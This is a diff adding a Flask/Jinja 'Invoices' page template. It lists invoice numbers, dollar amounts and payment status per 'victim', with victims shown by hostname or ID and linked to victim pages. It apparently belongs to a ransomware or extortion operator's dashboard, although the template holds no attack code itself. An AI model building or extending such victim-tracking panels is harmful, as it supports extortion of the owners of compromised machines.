@@ -1,0 +1,16 @@
+{% extends "base.html" %}
+{% block title %}invoices{% endblock %}
+{% block content %}
+<h1>Invoices</h1>
+<div class="panel">
+<table>
+  <tr><th>id</th><th>invoice</th><th>victim</th><th>amount</th><th>status</th><th>created</th><th>updated</th></tr>
+  {% for r in rows %}
+  <tr><td>{{ r['id'] }}</td><td>{{ r['number'] }}</td>
+    <td><a href="{{ url_for('victim', vid=r['vid']) }}">{{ r['hostname'] or r['vid'][:12] }}</a></td>
+    <td>${{ '%.2f'|format(r['amount'] or 0) }}</td><td>{{ r['status'] }}</td>
+    <td class="small">{{ r['created'] }}</td><td class="small">{{ r['updated'] }}</td></tr>
+  {% else %}<tr><td colspan="7" class="sub">no invoices</td></tr>{% endfor %}
+</table>
+</div>
+{% endblock %}
